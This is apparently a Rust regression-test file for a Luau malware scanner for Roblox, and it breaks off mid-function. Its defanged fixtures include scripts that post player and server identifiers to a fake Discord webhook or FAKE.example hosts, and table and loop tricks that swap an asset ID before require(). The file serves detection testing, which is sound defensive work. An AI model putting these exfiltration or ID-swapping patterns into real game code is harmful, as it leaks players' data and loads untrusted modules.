//! Review round 3 regressions for the Luau analyzer: round 4 brief items 1 to 9. Every
//! fixture is synthetic and defanged: asset IDs are in 999000000000000 to
//! 999999999999999, webhook strings end in `000/FAKE`, hosts are under `FAKE.example`.

use bloxguard_core::analysis::{AnalysisResult, analyze};
use bloxguard_core::finding::{Confidence, Finding, Severity};
use bloxguard_core::model::{Document, Instance, Limits};
use std::collections::BTreeMap;

/// The trusted ID used by the trust cases.
const TRUSTED: u64 = 999_000_000_000_000;
const TR: &str = "999000000000000";

fn script_document(source: &str) -> Document {
    Document {
        input: "FAKE_round3.luau".into(),
        instances: vec![Instance {
            name: "FAKE_Script".into(),
            class: "Script".into(),
            source: Some(source.into()),
            ..Instance::default()
        }],
        ..Document::default()
    }
}

fn analysis(source: &str) -> AnalysisResult {
    analyze(&script_document(source), 0, &Limits::default(), &[])
}

fn trusted_analysis(source: &str) -> AnalysisResult {
    analyze(&script_document(source), 0, &Limits::default(), &[TRUSTED])
}

fn describe(findings: &[Finding]) -> Vec<String> {
    findings
        .iter()
        .map(|finding| {
            format!(
                "{} {} {:?} {} | {}",
                finding.rule_id,
                finding.severity,
                finding.confidence,
                finding.message,
                finding.evidence
            )
        })
        .collect()
}

fn has(
    result: &AnalysisResult,
    rule: &str,
    severity: Severity,
    confidence: Option<Confidence>,
) -> bool {
    result.findings.iter().any(|finding| {
        finding.rule_id == rule
            && finding.severity >= severity
            && confidence.is_none_or(|confidence| finding.confidence == confidence)
    })
}

fn expect(
    label: &str,
    result: &AnalysisResult,
    rule: &str,
    severity: Severity,
    confidence: Option<Confidence>,
) {
    assert!(
        has(result, rule, severity, confidence),
        "{label}: expected {rule} at {severity} or above ({confidence:?})\nfindings: {:#?}\nreasons: {:?}",
        describe(&result.findings),
        result.reasons
    );
}

fn no_resolved_claim(label: &str, result: &AnalysisResult) {
    assert!(
        result
            .findings
            .iter()
            .all(|finding| !finding.evidence.contains("resolved asset id")),
        "{label}: {:#?}",
        describe(&result.findings)
    );
}

fn lines(count: usize, line: impl Fn(usize) -> String) -> String {
    (0..count).map(line).collect::<Vec<_>>().join("\n")
}

// ----- item 1: table changes and trusted IDs -------------------------------------------

/// Reviewer shapes F07 to F23 and more of the same idea. Each one replaces the trusted
/// value with 999000000003077 before the require.
fn table_change_shapes() -> Vec<(&'static str, String)> {
    let x = "999000000003077";
    vec![
        (
            "insert at the front",
            format!("local ids = {{{TR}}}\ntable.insert(ids, 1, {x})\nrequire(ids[1])"),
        ),
        (
            "rawset",
            format!("local cfg = {{id = {TR}}}\nrawset(cfg, \"id\", {x})\nrequire(cfg.id)"),
        ),
        (
            "sort",
            format!(
                "local ids = {{{TR}, {x}}}\ntable.sort(ids, function(a, b) return a > b end)\nrequire(ids[1])"
            ),
        ),
        (
            "remove the first",
            format!("local ids = {{{TR}, {x}}}\ntable.remove(ids, 1)\nrequire(ids[1])"),
        ),
        (
            "method writes self",
            format!(
                "local C = {{id = {TR}}}\nfunction C:set(v) self.id = v end\nC:set({x})\nrequire(C.id)"
            ),
        ),
        (
            "unknown function",
            format!("local t = {{{TR}}}\nFAKE_mutate(t)\nrequire(t[1])"),
        ),
        (
            "local alias",
            format!("local t = {{id = {TR}}}\nlocal alias = t\nalias.id = {x}\nrequire(t.id)"),
        ),
        (
            "helper writes a parameter",
            format!(
                "local t = {{id = {TR}}}\nlocal function f(x) x.id = {x} end\nf(t)\nrequire(t.id)"
            ),
        ),
        (
            "length index",
            format!("local ids = {{{TR}}}\nids[#ids] = {x}\nrequire(ids[1])"),
        ),
        (
            "nested alias",
            format!(
                "local t = {{id = {TR}}}\nlocal o = {{cfg = t}}\no.cfg.id = {x}\nrequire(t.id)"
            ),
        ),
        // Shapes that are not in the brief or the case script.
        (
            "insert in the middle",
            format!("local ids = {{{TR}, {TR}}}\ntable.insert(ids, 2, {x})\nrequire(ids[2])"),
        ),
        (
            "remove the last",
            format!("local ids = {{{x}, {TR}}}\ntable.remove(ids)\nrequire(ids[#ids])"),
        ),
        (
            "rawset through an alias",
            format!(
                "local cfg = {{id = {TR}}}\nlocal a = cfg\nrawset(a, \"id\", {x})\nrequire(cfg.id)"
            ),
        ),
        (
            "write through a list element",
            format!(
                "local cfg = {{id = {TR}}}\nlocal list = {{cfg}}\nlist[1].id = {x}\nrequire(cfg.id)"
            ),
        ),
        (
            "alias of a nested table",
            format!(
                "local o = {{inner = {{id = {TR}}}}}\nlocal i = o.inner\ni.id = {x}\nrequire(o.inner.id)"
            ),
        ),
        (
            "class method through __index",
            format!(
                "local K = {{}}\nK.__index = K\nfunction K:set(v) self.id = v end\nlocal obj = setmetatable({{id = {TR}}}, K)\nobj:set({x})\nrequire(obj.id)"
            ),
        ),
        (
            "pcall of a writer",
            format!(
                "local ids = {{{TR}}}\npcall(function(t) t[1] = {x} end, ids)\nrequire(ids[1])"
            ),
        ),
        (
            "task.spawn of a writer",
            format!(
                "local cfg = {{id = {TR}}}\ntask.spawn(function(t) t.id = {x} end, cfg)\nrequire(cfg.id)"
            ),
        ),
        (
            "coroutine.wrap of a writer",
            format!(
                "local cfg = {{id = {TR}}}\ncoroutine.wrap(function(t) t.id = {x} end)(cfg)\nrequire(cfg.id)"
            ),
        ),
        (
            "immediately invoked writer",
            format!(
                "local cfg = {{id = {TR}}}\n(function(t) t.id = {x} end)(cfg)\nrequire(cfg.id)"
            ),
        ),
        (
            "stored in _G then changed",
            format!("local cfg = {{id = {TR}}}\n_G.FAKE_cfg = cfg\nFAKE_reload()\nrequire(cfg.id)"),
        ),
        (
            "unknown method receives the table",
            format!("local cfg = {{id = {TR}}}\nFAKE_service:configure(cfg)\nrequire(cfg.id)"),
        ),
        (
            "unknown method on the table",
            format!(
                "local cfg = setmetatable({{id = {TR}}}, FAKE_meta)\ncfg:FAKE_reset()\nrequire(cfg.id)"
            ),
        ),
        (
            "__newindex metatable",
            format!(
                "local cfg = setmetatable({{}}, {{__newindex = function(t, k, v) rawset(t, k, v + 3077) end}})\ncfg.id = {TR}\nrequire(cfg.id)"
            ),
        ),
        (
            "table.move into the list",
            format!(
                "local src = {{{x}}}\nlocal ids = {{{TR}}}\ntable.move(src, 1, 1, 1, ids)\nrequire(ids[1])"
            ),
        ),
        (
            "clear then write",
            format!("local cfg = {{id = {TR}}}\ntable.clear(cfg)\ncfg.id = {x}\nrequire(cfg.id)"),
        ),
        (
            "computed key write",
            format!("local cfg = {{id = {TR}}}\ncfg[FAKE_key] = {x}\nrequire(cfg.id)"),
        ),
        (
            "in a loop over a list of tables",
            format!(
                "local cfg = {{id = {TR}}}\nfor _, t in {{cfg}} do t.id = {x} end\nrequire(cfg.id)"
            ),
        ),
        (
            "callback stored by an unknown event",
            format!(
                "local cfg = {{id = {TR}}}\nFAKE_event:Connect(function() cfg.id = {x} end)\nrequire(cfg.id)"
            ),
        ),
    ]
}

#[test]
fn item1_trust_never_hides_a_table_change() {
    for (label, source) in table_change_shapes() {
        let result = trusted_analysis(&source);
        expect(label, &result, "BG001", Severity::High, None);
        assert!(
            result.findings.iter().all(|finding| !finding
                .evidence
                .contains(&format!("resolved asset id: {TR}"))),
            "{label}: {:#?}",
            describe(&result.findings)
        );
    }
}

#[test]
fn item1_followed_changes_resolve_to_the_new_id() {
    for label in [
        "insert at the front",
        "rawset",
        "remove the first",
        "method writes self",
        "local alias",
        "helper writes a parameter",
        "length index",
        "nested alias",
        "insert in the middle",
        "remove the last",
        "rawset through an alias",
        "write through a list element",
        "alias of a nested table",
        "class method through __index",
        "immediately invoked writer",
        "clear then write",
    ] {
        let (_, source) = table_change_shapes()
            .into_iter()
            .find(|(name, _)| *name == label)
            .expect("shape");
        let result = analysis(&source);
        assert!(
            result
                .findings
                .iter()
                .any(|finding| finding.rule_id == "BG001"
                    && finding.confidence == Confidence::High
                    && finding.evidence.contains("999000000003077")),
            "{label}: {:#?}",
            describe(&result.findings)
        );
        assert!(
            result
                .findings
                .iter()
                .all(|finding| !finding.evidence.contains(TR)),
            "{label}: the replaced value is not a candidate: {:#?}",
            describe(&result.findings)
        );
    }
}

/// Alias forms crossed with change forms, generated: every combination must leave a
/// finding under trust.
#[test]
fn item1_generated_alias_and_change_combinations_are_never_trusted_away() {
    let aliases: [(&str, &str); 6] = [
        ("direct", "local t = target\n{change}"),
        ("local alias", "local a = target\nlocal t = a\n{change}"),
        (
            "field path",
            "local box = {inner = target}\nlocal t = box.inner\n{change}",
        ),
        (
            "helper parameter",
            "local function helper(t)\n{change}\nend\nhelper(target)",
        ),
        (
            "method self",
            "local holder = {inner = target}\nfunction holder:run()\nlocal t = self.inner\n{change}\nend\nholder:run()",
        ),
        (
            "closure",
            "local function later()\nlocal t = target\n{change}\nend\nlater()",
        ),
    ];
    let changes: [&str; 8] = [
        "t[1] = 999000000003090",
        "rawset(t, 1, 999000000003090)",
        "table.insert(t, 1, 999000000003090)",
        "table.remove(t, 1)",
        "table.sort(t)",
        "FAKE_change(t)",
        "t[FAKE_k] = 999000000003090",
        "FAKE_change(setmetatable({}, {__index = t}))",
    ];
    let mut count = 0;
    for (alias, template) in aliases {
        for change in changes {
            let body = template.replace("{change}", change);
            let source =
                format!("local target = {{{TR}, 999000000003090}}\n{body}\nrequire(target[1])");
            let result = trusted_analysis(&source);
            assert!(
                has(&result, "BG001", Severity::High, None),
                "{alias} / {change}:\n{source}\n{:#?}",
                describe(&result.findings)
            );
            count += 1;
        }
    }
    assert_eq!(count, 48);
}

/// An unknown metatable is reported under trust: a table read is not a constant target
/// (review round 4), so the trusted ID is not applied.
#[test]
fn item1_trust_is_not_applied_to_a_table_with_an_unknown_metatable() {
    let source = format!("local t = {{{TR}}}\nsetmetatable(t, FAKE_meta)\nrequire(t[1])");
    let result = trusted_analysis(&source);
    expect(
        "present key",
        &result,
        "BG001",
        Severity::High,
        Some(Confidence::Medium),
    );
    no_resolved_claim(&source, &result);
    let result = trusted_analysis(&format!(
        "local t = setmetatable({{}}, FAKE_meta)\nrequire(t.id or {TR})"
    ));
    expect(
        "missing key",
        &result,
        "BG001",
        Severity::High,
        Some(Confidence::Medium),
    );
}

/// Trust still removes a constant target. Since review round 4 the other fully resolved
/// forms that this test listed (table reads, instance branches and call results) are
/// reported with the trusted ID marked as not applied; see `only_trust_not_applied`.
#[test]
fn item1_fully_resolved_trusted_values_are_still_suppressed() {
    for source in [
        format!("require({TR})"),
        format!("local id = {TR}\nrequire(id)"),
        format!("local base = {TR}\nlocal id = base\nrequire(id)"),
        format!("require(FAKE_c and {TR} or {TR})"),
    ] {
        let result = trusted_analysis(&source);
        assert!(
            result.findings.is_empty(),
            "{source}: {:#?}",
            describe(&result.findings)
        );
    }
    for source in [
        format!("local t = {{id = {TR}}}\nrequire(t.id)"),
        format!("local t = {{{TR}}}\nprint(t)\nrequire(t[1])"),
        format!("local t = {{id = {TR}}}\nlocal a = t\nrequire(a.id)"),
        format!("local id = if FAKE_c then {TR} else script.Parent.FAKE_Module\nrequire(id)"),
        format!("local t = table.freeze({{id = {TR}}})\nrequire(t.id)"),
        format!("local t = {{{TR}}}\nfor _, v in ipairs(t) do print(v) end\nrequire(t[1])"),
        format!("local t = table.clone({{id = {TR}}})\nrequire(t.id)"),
        format!(
            "local t = {{id = {TR}}}\nlocal function read(x) return x.id end\nrequire(read(t))"
        ),
    ] {
        let result = trusted_analysis(&source);
        only_trust_not_applied(&source, &result);
    }
}

#[test]
fn item1_trusted_candidates_among_unknown_values_still_report() {
    for source in [
        format!("local id = {TR}\nif FAKE_c then id = FAKE_lookup() end\nrequire(id)"),
        format!("local t = {{{TR}}}\nFAKE_fill(t)\nrequire(t[1])"),
        format!("require(FAKE_flag and {TR} or FAKE_other)"),
    ] {
        let result = trusted_analysis(&source);
        expect(
            &source,
            &result,
            "BG001",
            Severity::High,
            Some(Confidence::Medium),
        );
        no_resolved_claim(&source, &result);
    }
}

/// A candidate set that hits the size cap is not complete, so trust cannot clear it.
#[test]
fn item1_overflowing_candidate_sets_are_not_resolved() {
    let trusted: Vec<u64> = (0..12).map(|index| TRUSTED + index).collect();
    let mut source = String::from("local id = 999000000000000\n");
    for index in 1..12u64 {
        source.push_str(&format!(
            "if FAKE_c{index} then id = {} end\n",
            TRUSTED + index
        ));
    }
    source.push_str("if FAKE_c99 then id = 999000000003099 end\nrequire(id)");
    let result = analyze(&script_document(&source), 0, &Limits::default(), &trusted);
    expect("overflow", &result, "BG001", Severity::High, None);
}

#[test]
fn item1_table_pack_count_is_known() {
    let result = analysis(
        "local function f(...) local t = table.pack(...) return require(t[t.n]) end\nf(1, 2, 999000000003015)",
    );
    assert!(
        result
            .findings
            .iter()
            .any(|finding| finding.rule_id == "BG001"
                && finding.severity == Severity::High
                && finding.evidence.contains("999000000003015")),
        "{:#?}",
        describe(&result.findings)
    );
    assert!(
        result
            .findings
            .iter()
            .all(|finding| !finding.evidence.contains("asset id: 1]")
                && !finding.evidence.contains("asset id: 2]")),
        "{:#?}",
        describe(&result.findings)
    );
}

#[test]
fn item1_clean_table_code_gets_no_new_findings() {
    for source in [
        "local Queue = {}\nQueue.__index = Queue\nfunction Queue.new() return setmetatable({ items = {} }, Queue) end\nfunction Queue:push(v) table.insert(self.items, v) end\nlocal q = Queue.new()\nfor i = 1, 10 do q:push(i) end\nreturn q",
        "local Modules = { Util = script.Parent.FAKE_Util }\nlocal Util = require(Modules.Util)\nreturn Util",
        "local list = {}\nfor _, child in script.Parent:GetChildren() do table.insert(list, child) end\ntable.sort(list, function(a, b) return a.Name < b.Name end)\nfor _, m in list do require(m) end",
        "local cache = {}\nlocal function get(m) if not cache[m] then cache[m] = require(m) end return cache[m] end\nreturn get(script.Parent.FAKE_Module)",
    ] {
        let result = analysis(source);
        assert!(
            result
                .findings
                .iter()
                .all(|finding| finding.severity < Severity::High),
            "{source}: {:#?}",
            describe(&result.findings)
        );
    }
}

// ----- item 4: loops -------------------------------------------------------------------

fn loop_forms(body: &str) -> Vec<(&'static str, String)> {
    vec![
        ("numeric for", format!("for i = 1, 3 do {body} end")),
        ("while", format!("while FAKE_c do {body} end")),
        ("repeat", format!("repeat {body} until FAKE_c")),
        (
            "generic for",
            format!("for _, v in FAKE_list do {body} end"),
        ),
        (
            "nested",
            format!("for i = 1, 2 do for j = 1, 2 do {body} end end"),
        ),
        (
            "closure in a loop",
            format!("for i = 1, 2 do task.spawn(function() {body} end) end"),
        ),
    ]
}

#[test]
fn item4_values_changed_in_loops_are_unresolved_candidates() {
    let start = "999000000000500";
    let mut count = 0;
    for update in [
        "id += 1",
        "id = id + 1",
        "id = id * 1",
        "id = tonumber(tostring(id) .. \"\")",
        "id = id - 3077 + 3077",
    ] {
        for (form, looped) in loop_forms(update) {
            let source = format!("local id = {start}\n{looped}\nrequire(id)");
            for (label, result) in [
                ("plain", analysis(&source)),
                ("trusted", trusted_analysis(&source.replace(start, TR))),
            ] {
                let label = format!("{form} / {update} / {label}");
                expect(
                    &label,
                    &result,
                    "BG001",
                    Severity::High,
                    Some(Confidence::Medium),
                );
                no_resolved_claim(&label, &result);
            }
            count += 1;
        }
    }
    assert_eq!(count, 30);
}

#[test]
fn item4_reads_before_the_write_in_a_loop_see_later_values() {
    for (form, looped) in loop_forms("require(id) id = id + 3077") {
        let source = format!("local id = {TR}\n{looped}");
        let result = trusted_analysis(&source);
        expect(
            form,
            &result,
            "BG001",
            Severity::High,
            Some(Confidence::Medium),
        );
    }
    for (form, looped) in loop_forms("require(cfg.id) cfg.id = cfg.id + 3077") {
        let source = format!("local cfg = {{id = {TR}}}\n{looped}");
        let result = trusted_analysis(&source);
        expect(
            form,
            &result,
            "BG001",
            Severity::High,
            Some(Confidence::Medium),
        );
    }
}

#[test]
fn item4_literal_writes_in_loops_stay_exact() {
    for (form, looped) in loop_forms("id = 999000000000804") {
        let source = format!("local id = script.Parent.FAKE_Module\n{looped}\nrequire(id)");
        let result = analysis(&source);
        assert!(
            result
                .findings
                .iter()
                .any(|finding| finding.rule_id == "BG001"
                    && finding.confidence == Confidence::High
                    && finding
                        .evidence
                        .contains("resolved asset id: 999000000000804")),
            "{form}: {:#?}",
            describe(&result.findings)
        );
    }
}

#[test]
fn item4_loop_bindings_stay_candidates() {
    let result = trusted_analysis(&format!(
        "local id = {TR}\nfor _, v in {{999000000003081}} do id = v end\nrequire(id)"
    ));
    assert!(
        result
            .findings
            .iter()
            .any(|finding| finding.rule_id == "BG001"
                && finding.severity == Severity::High
                && finding.evidence.contains("999000000003081")),
        "{:#?}",
        describe(&result.findings)
    );
}

#[test]
fn item4_several_candidates_are_never_called_resolved() {
    for source in [
        "local id\nif FAKE_c then id = 999000000000901 else id = 999000000000902 end\nrequire(id)",
        "local ids = {999000000000903, 999000000000904}\nrequire(ids[FAKE_i])",
        "require(if FAKE_c then 999000000000905 else 999000000000906)",
    ] {
        let result = analysis(source);
        let high: Vec<&Finding> = result
            .findings
            .iter()
            .filter(|finding| finding.rule_id == "BG001" && finding.severity >= Severity::High)
            .collect();
        assert_eq!(high.len(), 2, "{source}: {:#?}", describe(&result.findings));
        no_resolved_claim(source, &result);
        assert!(
            high.iter()
                .all(|finding| finding.evidence.contains("asset id candidate"))
        );
    }
}

#[test]
fn item4_loop_widening_is_bounded() {
    // Many distinct assignments in one loop, and deep loop nesting.
    let wide = format!(
        "local id = {TR}\nfor i = 1, 2 do\n{}\nend\nrequire(id)",
        lines(400, |index| format!("FAKE_v{index} = {index}"))
    );
    let result = trusted_analysis(&wide);
    assert!(result.reasons.is_empty(), "{:?}", result.reasons);
    let mut deep = String::from("local id = 999000000000000\n");
    for _ in 0..300 {
        deep.push_str("for i = 1, 2 do ");
    }
    deep.push_str("id += 1");
    for _ in 0..300 {
        deep.push_str(" end");
    }
    deep.push_str("\nrequire(id)");
    let started = std::time::Instant::now();
    let result = trusted_analysis(&deep);
    assert!(started.elapsed() < std::time::Duration::from_secs(10));
    expect(
        "deep loops",
        &result,
        "BG001",
        Severity::High,
        Some(Confidence::Medium),
    );
}

// ----- item 2: instance shaped receivers -----------------------------------------------

fn with_property(name: &str, class: &str, property: &str, value: serde_json::Value) -> Instance {
    let mut properties = BTreeMap::new();
    properties.insert(property.into(), value);
    Instance {
        name: name.into(),
        class: class.into(),
        properties,
        ..Instance::default()
    }
}

/// A model with an ID in a NumberValue, an ObjectValue pointing at it, two children
/// with the same name, a folder, and an ID attribute on the model itself. The loader
/// script is the last instance and a child of the model.
fn bg002_model(source: &str) -> Document {
    let mut root = Instance {
        name: "FAKE_Model".into(),
        class: "Model".into(),
        ..Instance::default()
    };
    root.attributes
        .insert("FAKE_id".into(), serde_json::json!(999_000_000_003_200u64));
    let mut instances = vec![root];
    let mut push = |mut instance: Instance, parent: usize| {
        instance.parent = Some(parent);
        instances.push(instance);
        instances.len() - 1
    };
    push(
        with_property(
            "FAKE_Id",
            "NumberValue",
            "Value",
            serde_json::json!(999_000_000_003_201u64),
        ),
        0,
    );
    push(
        with_property(
            "FAKE_Ptr",
            "ObjectValue",
            "Value",
            serde_json::json!("FAKE_ref"),
        ),
        0,
    );
    for _ in 0..2 {
        push(
            with_property(
                "FAKE_Dup",
                "IntValue",
                "Value",
                serde_json::json!(999_000_000_003_202u64),
            ),
            0,
        );
    }
    let folder = push(
        Instance {
            name: "FAKE_Folder".into(),
            class: "Folder".into(),
            ..Instance::default()
        },
        0,
    );
    push(
        with_property(
            "FAKE_Inner",
            "StringValue",
            "Value",
            serde_json::json!("999000000003203"),
        ),
        folder,
    );
    push(
        Instance {
            name: "FAKE_Module".into(),
            class: "ModuleScript".into(),
            source: Some("return {}".into()),
            ..Instance::default()
        },
        0,
    );
    push(
        Instance {
            name: "FAKE_Loader".into(),
            class: "Script".into(),
            source: Some(source.into()),
            ..Instance::default()
        },
        0,
    );
    Document {
        input: "FAKE_model.rbxmx".into(),
        instances,
        ..Document::default()
    }
}

fn analyze_model(document: &Document) -> AnalysisResult {
    analyze(
        document,
        document.instances.len() - 1,
        &Limits::default(),
        &[],
    )
}

const OUTSIDE: &str = "value comes from outside the scanned content";

/// Objects inside the model that the scanner cannot pin down, crossed with value and
/// attribute reads, give BG002 and never the outside message.
#[test]
fn item2_generated_in_model_reads_are_bg002() {
    let receivers: [&str; 13] = [
        "script.Parent:GetChildren()[1]",
        "script.Parent:GetChildren()[FAKE_i]",
        "script.Parent:GetDescendants()[2]",
        "script.Parent:FindFirstChildOfClass(\"NumberValue\")",
        "script.Parent:FindFirstChildWhichIsA(\"ValueBase\")",
        "script.Parent:FindFirstChild(\"FAKE_Inner\", true)",
        "script.Parent:WaitForChild(FAKE_name)",
        "script.Parent[FAKE_name]",
        "script.Parent.FAKE_Dup",
        "script.Parent.FAKE_Ptr.Value",
        "script.Parent:GetChildren()[1]:Clone()",
        "script.Parent.FAKE_Folder:GetChildren()[1]",
        "(script.Parent:GetChildren())[1]",
    ];
    let accessors: [fn(&str) -> String; 6] = [
        |x| format!("{x}.Value"),
        |x| format!("{x}:GetAttribute(\"FAKE_id\")"),
        |x| format!("{x}:GetAttributes().FAKE_id"),
        |x| format!("tonumber({x}.Value)"),
        |x| format!("{x}.Value :: number"),
        |x| format!("{x}.Value + 0"),
    ];
    let mut count = 0;
    for receiver in receivers {
        for accessor in accessors {
            let target = accessor(receiver);
            for source in [
                format!("require({target})"),
                format!("local FAKE_v = {target}\nrequire(FAKE_v)"),
            ] {
                let result = analyze_model(&bg002_model(&source));
                expect(&source, &result, "BG002", Severity::Critical, None);
                assert!(
                    result
                        .findings
                        .iter()
                        .all(|finding| finding.message != OUTSIDE
                            && !(finding.rule_id == "BG001" && finding.severity == Severity::Low)),
                    "{source}: {:#?}",
                    describe(&result.findings)
                );
                count += 1;
            }
        }
    }
    assert_eq!(count, 156);
}

#[test]
fn item2_loops_over_instances_and_attributes_are_bg002() {
    for (label, source, confidence) in [
        (
            "children loop",
            "for _, v in script.Parent:GetChildren() do require(v.Value) end",
            Confidence::Low,
        ),
        (
            "ipairs descendants",
            "for _, v in ipairs(script.Parent:GetDescendants()) do if v:IsA(\"IntValue\") then require(v.Value) end end",
            Confidence::Low,
        ),
        (
            "stored list",
            "local kids = script.Parent:GetChildren()\nrequire(kids[#kids].Value)",
            Confidence::Low,
        ),
        (
            "attribute loop",
            "for k, v in script.Parent:GetAttributes() do require(v) end",
            Confidence::High,
        ),
        (
            "pairs attribute loop",
            "for k, v in pairs(script.Parent:GetAttributes()) do if typeof(v) == \"number\" then require(v) end end",
            Confidence::High,
        ),
        (
            "attribute table field",
            "local attrs = script.Parent:GetAttributes()\nrequire(attrs.FAKE_id)",
            Confidence::High,
        ),
        (
            "missing attribute",
            "require(script.Parent:GetAttribute(\"FAKE_missing\"))",
            Confidence::Low,
        ),
        (
            "computed attribute name",
            "require(script.Parent:GetAttribute(FAKE_name))",
            Confidence::Low,
        ),
        (
            "ancestor of class",
            "require(script:FindFirstAncestorOfClass(\"Model\"):GetAttribute(\"FAKE_id\"))",
            Confidence::High,
        ),
    ] {
        let result = analyze_model(&bg002_model(source));
        // An attribute the content does not store is set at runtime: medium.
        let severity = if label == "missing attribute" {
            Severity::Medium
        } else {
            Severity::Critical
        };
        expect(label, &result, "BG002", severity, Some(confidence));
        assert!(
            result
                .findings
                .iter()
                .all(|finding| finding.message != OUTSIDE),
            "{label}: {:#?}",
            describe(&result.findings)
        );
    }
}

#[test]
fn item2_paths_that_leave_the_content_keep_the_outside_message() {
    for source in [
        "require(script.Parent.Parent:GetChildren()[1].Value)",
        "require(game:GetService(\"ReplicatedStorage\"):GetChildren()[1].Value)",
        "for _, v in workspace:GetDescendants() do require(v.Value) end",
        "require(script.Parent.Parent:GetAttributes().FAKE_id)",
        "require(script.Parent.FAKE_Missing.Value)",
    ] {
        let result = analyze_model(&bg002_model(source));
        assert!(
            result
                .findings
                .iter()
                .any(|finding| finding.rule_id == "BG002" && finding.message == OUTSIDE),
            "{source}: {:#?}",
            describe(&result.findings)
        );
    }
}

#[test]
fn item2_requiring_instances_is_still_local() {
    for source in [
        "for _, m in script.Parent:GetChildren() do if m:IsA(\"ModuleScript\") then require(m) end end",
        "require(script.Parent:FindFirstChildOfClass(\"ModuleScript\"))",
        "require(script.Parent.FAKE_Ptr.Value)",
        "require(script.Parent:GetChildren()[1])",
        "require(script.Parent[FAKE_name])",
        "local mods = {}\nfor _, child in ipairs(script.Parent:GetDescendants()) do mods[child.Name] = require(child) end",
        "require(script.Parent:FindFirstChild(\"FAKE_Module\", true))",
    ] {
        let result = analyze_model(&bg002_model(source));
        assert!(
            result.findings.is_empty(),
            "{source}: {:#?}",
            describe(&result.findings)
        );
    }
}

// ----- item 3: HTTP methods need an HTTP receiver --------------------------------------

/// Store objects whose `GetAsync`, `SetAsync` and `UpdateAsync` share names with
/// `HttpService`, in every lookup spelling.
fn store_receivers() -> Vec<String> {
    let services = [
        "game:GetService(\"DataStoreService\")",
        "game:FindService(\"DataStoreService\")",
        "game:service(\"DataStoreService\")",
        "game.DataStoreService",
    ];
    let mut receivers = Vec::new();
    for service in services {
        for getter in [
            "GetDataStore(\"FAKE\")",
            "GetGlobalDataStore()",
            "GetOrderedDataStore(\"FAKE\")",
        ] {
            receivers.push(format!("{service}:{getter}"));
        }
    }
    for getter in [
        "GetSortedMap(\"FAKE\")",
        "GetQueue(\"FAKE\")",
        "GetHashMap(\"FAKE\")",
    ] {
        receivers.push(format!("game:GetService(\"MemoryStoreService\"):{getter}"));
    }
    receivers
}

#[test]
fn item3_store_objects_are_never_http() {
    let mut count = 0;
    for receiver in store_receivers() {
        for call in [
            "store:GetAsync(\"p_\" .. p.UserId)",
            "store:GetAsync(game.JobId)",
            "store:SetAsync(\"p_\" .. p.UserId, {name = p.Name})",
            "store:GetAsync(\"https://FAKE.example/looks_like_a_url\")",
            "pcall(store.GetAsync, store, \"p_\" .. p.UserId)",
            "store[\"GetAsync\"](store, tostring(p.UserId))",
        ] {
            for source in [
                format!(
                    "local store = {receiver}\ngame:GetService(\"Players\").PlayerAdded:Connect(function(p) print({call}) end)"
                ),
                format!(
                    "local DS = {receiver}\nlocal store = DS\nlocal p = game:GetService(\"Players\").LocalPlayer\nprint({call})"
                ),
            ] {
                let result = analysis(&source);
                assert!(
                    result
                        .findings
                        .iter()
                        .all(|finding| finding.rule_id != "BG008"),
                    "{source}: {:#?}",
                    describe(&result.findings)
                );
                count += 1;
            }
        }
    }
    assert_eq!(count, 180);
}

#[test]
fn item3_store_services_in_a_place_file_are_not_http() {
    let mut instances = vec![Instance {
        name: "Game".into(),
        class: "DataModel".into(),
        ..Instance::default()
    }];
    instances.push(Instance {
        name: "DataStoreService".into(),
        class: "DataStoreService".into(),
        parent: Some(0),
        ..Instance::default()
    });
    instances.push(Instance {
        name: "FAKE_Saver".into(),
        class: "Script".into(),
        parent: Some(0),
        source: Some("local store = game:GetService(\"DataStoreService\"):GetDataStore(\"FAKE\")\nprint(store:GetAsync(game.JobId))".into()),
        ..Instance::default()
    });
    let document = Document {
        input: "FAKE_place.rbxlx".into(),
        instances,
        ..Document::default()
    };
    let result = analyze(&document, 2, &Limits::default(), &[]);
    assert!(
        result.findings.is_empty(),
        "{:#?}",
        describe(&result.findings)
    );
}

#[test]
fn item3_http_service_in_any_spelling_is_still_http() {
    for service in [
        "game:GetService(\"HttpService\")",
        "game:FindService(\"HttpService\")",
        "game:service(\"HttpService\")",
        "game.HttpService",
        "game:GetService(string.reverse(\"ecivreSpttH\"))",
        "({ http = game:GetService(\"HttpService\") }).http",
    ] {
        let get = format!(
            "local H = {service}\nlocal p = game:GetService(\"Players\").LocalPlayer\nH:GetAsync(\"https://api.FAKE.example/v1?u=\" .. p.UserId)"
        );
        expect(
            &get,
            &analysis(&get),
            "BG008",
            Severity::Medium,
            Some(Confidence::Medium),
        );
        let post = format!(
            "local H = {service}\nH:PostAsync(\"https://discord.com/api/webhooks/000/FAKE\", \"FAKE\")"
        );
        expect(
            &post,
            &analysis(&post),
            "BG008",
            Severity::High,
            Some(Confidence::High),
        );
        let alias = format!(
            "local H = {service}\npcall(H.PostAsync, H, \"https://collect.FAKE.example/x\", tostring(game.JobId))"
        );
        expect(&alias, &analysis(&alias), "BG008", Severity::High, None);
    }
}

#[test]
fn item3_unknown_receivers_count_only_with_a_url() {
    for (source, http) in [
        (
            "local Http = require(script.Parent.FAKE_Http)\nlocal p = game:GetService(\"Players\").LocalPlayer\nHttp:GetAsync(\"https://api.FAKE.example/v1?u=\" .. p.UserId)",
            true,
        ),
        (
            "local function send(client, url, body) return client:PostAsync(url, body) end\nsend(game:GetService(\"HttpService\"), \"https://discord.com/api/webhooks/000/FAKE\", \"FAKE\")",
            true,
        ),
        (
            "local function load(store, p) return store:GetAsync(\"p_\" .. p.UserId) end\nreturn load",
            false,
        ),
        (
            "local cache = require(script.Parent.FAKE_Cache)\nprint(cache:GetAsync(game.JobId))",
            false,
        ),
    ] {
        let result = analysis(source);
        assert_eq!(
            result
                .findings
                .iter()
                .any(|finding| finding.rule_id == "BG008"),
            http,
            "{source}: {:#?}",
            describe(&result.findings)
        );
    }
}

// ----- item 5: BG008 data --------------------------------------------------------------

const HTTP: &str = "local H = game:GetService(\"HttpService\")\n";

#[test]
fn item5_generated_sensitive_members_and_flows_are_reported() {
    let members = [
        "p.DisplayName",
        "p.Name",
        "p.UserId",
        "game.GameId",
        "game.PrivateServerId",
        "game.PrivateServerOwnerId",
        "game.JobId",
        "game.PlaceId",
    ];
    let flows: [fn(&str) -> String; 6] = [
        |data| format!("H:PostAsync(\"https://collect.FAKE.example/x\", tostring({data}))"),
        |data| {
            format!("H:PostAsync(\"https://collect.FAKE.example/x\", H:JSONEncode({{v = {data}}}))")
        },
        |data| {
            format!(
